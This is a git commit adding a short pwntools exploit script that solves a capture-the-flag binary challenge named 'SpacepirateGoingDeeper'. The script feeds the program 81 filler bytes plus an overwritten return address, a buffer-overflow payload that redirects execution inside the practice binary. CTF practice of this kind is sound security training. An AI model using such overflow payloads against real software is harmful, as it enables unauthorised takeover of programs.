988b5f5b1f85582209dfa6d89e5853192eb778d1
szhan21 <shunda.zhang@intel.com>
2023-01-05 22:22:44 +0800

    Attacking SpacepirateGoingDeeper...

---
+++ ctf/pwn/SpacepirateGoingDeeper/dec.py
@@ -0,0 +1,11 @@
+from pwn import *
+
+io = process('./sp_going_deeper')
+
+io.recvuntil('>>')
+io.sendline('1')
+io.recvuntil('[*] Input: ')
+
+payload = 'A'*(81) + p64(0x400b12)
+io.sendline(payload)
+print io.recvall()
